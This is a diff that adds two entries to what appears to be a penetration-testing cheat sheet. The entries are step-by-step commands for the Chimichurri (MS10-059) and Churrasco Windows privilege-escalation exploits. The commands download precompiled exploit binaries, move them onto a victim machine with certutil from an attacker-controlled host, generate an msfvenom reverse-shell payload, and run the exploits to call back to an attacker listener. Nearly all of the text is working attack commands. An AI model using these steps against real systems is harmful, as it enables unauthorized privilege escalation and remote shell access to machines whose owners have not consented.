@@ -895,6 +895,19 @@ checksec file_name_here
 
 
 
+## CHIMICHURRI
+```powershell
+# prepare exploit
+## download Chimichurri.exe onto attacker box
+wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
+## set up python http server + transfer exploit to victim box
+certutil -urlcache -split -f http://attacker_IP_here/Chimichurri.exe >Chimichurri.exe
+## set up listener on attacker box + run on victim box
+.\Chimichurri.exe attacker_IP_here port_here
+```
+
+
+
 ## CHISEL
 ```bash
 # set up tunnel
@@ -918,6 +931,21 @@ chisel server -p listener_port_here --reverse
 
 ## set up client
 chisel client  attacker_IP_here:listener_port_here R:socks
+```
+
+
+
+## CHURRASCO
+```powershell
+# prepare exploit
+## download churrasco.exe onto attacker box
+wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
+## generate reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here -f exe -a x86 -o shell.exe 
+## set up python http server + transfer reverse shell + exploit to victim box
+certutil -urlcache -split -f http://attacker_IP_here/churrasco.exe >churrasco.exe
+## set up listener on attacker box + run on victim box
+.\churrasco.exe shell.exe
 ```
 
 
